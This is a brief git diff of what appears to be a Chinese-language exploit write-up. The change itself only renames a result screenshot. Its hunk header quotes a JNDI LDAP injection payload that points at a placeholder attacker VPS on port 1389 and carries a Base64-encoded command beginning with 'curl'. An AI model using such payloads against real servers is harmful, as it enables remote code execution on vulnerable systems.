@@ -14,4 +14,4 @@ JNDI:ldap://你的VPSIP:1389/Basic/Command/Base64/Y3VybCB4eHh4c3Nzam5kaWV4cHgyMj
 
 # 效果：
 
-![avatar](jndiexp.PNG)
+![avatar](jndiexp1.png)
